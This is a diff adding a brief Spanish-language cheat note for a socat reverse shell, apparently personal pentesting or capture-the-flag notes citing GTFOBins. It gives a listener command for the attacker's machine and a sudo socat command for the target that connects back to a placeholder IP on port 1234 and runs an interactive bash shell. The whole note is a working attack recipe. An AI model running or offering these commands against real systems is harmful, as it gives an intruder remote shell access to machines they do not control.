@@ -1,0 +1,13 @@
+
+#### en tu maquina
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+
+#### en la objetivo 
+sudo socat tcp-connect:<your-ip-address>:1234 exec:bash,pty,stderr,setsid,sigint,sane
+---------- your ip se cambia por tu ip el formato es 192.168.0.0:1234 sin los '<  >'
+
+
+fuente
+https://gtfobins.github.io/gtfobins/socat/#reverse-shell
+
+
